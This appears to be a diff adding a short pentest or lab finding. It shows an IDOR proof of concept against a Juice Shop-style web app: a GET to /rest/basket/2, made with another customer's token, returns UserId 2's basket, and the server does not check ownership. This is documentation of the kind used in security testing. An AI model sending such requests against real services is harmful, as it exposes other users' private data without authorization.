@@ -1,0 +1,27 @@
+IDOR Demonstration - GET /rest/basket/2
+
+Request:
+GET /rest/basket/2 HTTP/1.1
+Host: 10.10.10.50:3000
+Authorization: Bearer <JWT-FOR-USERID-24-CUSTOMER-ROLE-REDACTED>
+
+Response:
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "data": {
+    "id": 2,
+    "UserId": 2,
+    "Products": [
+      {"name": "Raspberry Juice (1000ml)", "quantity": 2}
+    ]
+  }
+}
+
+Analysis:
+- Authenticated as UserId 24 (token issued for customer role)
+- Requested basket belonging to UserId 2
+- Server returned the data without verifying ownership
+- IDOR confirmed
